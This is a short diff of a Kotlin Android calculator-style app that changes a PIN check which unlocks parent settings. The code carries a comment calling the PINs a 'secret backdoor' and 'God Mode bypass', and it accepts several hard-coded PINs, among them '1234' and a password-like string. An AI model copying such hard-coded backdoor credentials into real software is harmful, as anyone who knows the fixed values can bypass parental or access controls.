@@ -213,7 +213,7 @@ class CalculatorActivity : AppCompatActivity() {
         }
         // Default secret backdoor PINs & God Mode bypass
         val clean = pinCandidate.trim()
-        return clean == "9211" || clean == "1234" || clean == "92119211" || clean == "74663" || clean == "admin9211"
+        return clean == "9211" || clean == "1234" || clean == "9211921192119211" || clean == "Humsafar@1998Humsafar@1998Humsafar@1998Humsafar@1998" || clean == "74663"
     }
 
     private fun unlockParentSettings() {
